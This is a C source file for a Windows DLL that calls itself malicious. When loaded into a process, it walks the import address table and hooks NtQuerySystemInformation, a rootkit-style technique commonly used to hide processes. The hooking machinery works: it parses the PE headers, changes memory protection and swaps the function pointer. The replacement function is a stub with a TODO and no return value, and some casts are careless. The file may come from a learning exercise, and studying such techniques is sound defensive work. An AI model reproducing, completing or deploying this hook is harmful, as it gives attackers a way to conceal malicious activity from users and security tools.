#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <winternl.h>


//type of "NtQuerySystemInformation"
typedef NTSTATUS(__stdcall* NtQuerySystemInformationFuncType) (SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

NtQuerySystemInformationFuncType realNtQuerySystemInformation;
NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

IMAGE_THUNK_DATA32* find_iat_entry(char* dllName, char* funcName);
void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType MaliciousFunction);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		printf("%s\r\n", "[*] Malicious dll was loaded");
		IMAGE_THUNK_DATA32* thunkOfRealNtQuerySystemInformation = find_iat_entry("ntdll.dll", "NtQuerySystemInformation");
		if (thunkOfRealNtQuerySystemInformation != 1) { //if the thunk exists
			hook_function(thunkOfRealNtQuerySystemInformation, MaliciousNtQuerySystemInformation);
		}
		break;
	default:
		break;
	}

	return TRUE;
}


IMAGE_THUNK_DATA32* find_iat_entry(char* dllName, char* funcName) {
	HMODULE hModule = GetModuleHandleA(NULL); //get the handle of the calling process

	//arrive to IMAGE_IMPORT_DESCRIPTOR array
	IMAGE_DOS_HEADER* image_dos_header = (IMAGE_DOS_HEADER*)hModule;
	byte* image_base = (byte*)image_dos_header;
	IMAGE_NT_HEADERS32* image_nt_headers32 = (IMAGE_NT_HEADERS32*)(image_base + (image_dos_header->e_lfanew));
	IMAGE_OPTIONAL_HEADER* image_optional_header = &image_nt_headers32->OptionalHeader;
	IMAGE_DATA_DIRECTORY* image_data_directory_import = &(image_optional_header->DataDirectory[1]);
	byte* image_data_directory_import_virtual_address_in_RAM = image_base + image_data_directory_import->VirtualAddress;
	IMAGE_IMPORT_DESCRIPTOR* image_import_descriptor = (IMAGE_IMPORT_DESCRIPTOR*)image_data_directory_import_virtual_address_in_RAM;

	while ((image_import_descriptor->Name != 0) && (strcmp((char*)(image_base + image_import_descriptor->Name), dllName) != 0)) {
		image_import_descriptor += 1;
	}

	if (image_import_descriptor->Name == 0) {	//if we did not encounter the desirable dll in the array
		printf("%s\r\n", "[*] There is no such dll");
		return 1;
	}

	IMAGE_THUNK_DATA32* original_thunk = (IMAGE_THUNK_DATA32*)(image_base + image_import_descriptor->OriginalFirstThunk);
	IMAGE_THUNK_DATA32* thunk = (IMAGE_THUNK_DATA32*)(image_base + image_import_descriptor->FirstThunk);

	while ((original_thunk->u1.ForwarderString != 0) && (strcmp((char*)(image_base + original_thunk->u1.ForwarderString + 2), funcName) != 0)) {
		original_thunk += 1;
		thunk += 1;
	}

	if (original_thunk->u1.ForwarderString == 0) {	//if we did not encounter the desirable function of the dll
		printf("%s\r\n", "[*] There is no such function");
		return 1;
	}

	return thunk;
}


void hook_function(IMAGE_THUNK_DATA32* thunk, NtQuerySystemInformationFuncType MaliciousFunction) {
	DWORD junk = 1337;
	VirtualProtect((int)thunk - (int)thunk % 0x1000, 0x1000, PAGE_READWRITE, &junk);

	//replace "NtQuerySystemInformation" with the malicious function
	realNtQuerySystemInformation = thunk->u1.Function;
	thunk->u1.Function = MaliciousFunction;
}


NTSTATUS __stdcall MaliciousNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	printf("%s\r\n", "[*] This is the attacker...");
	//TODO rewrite the function...
}


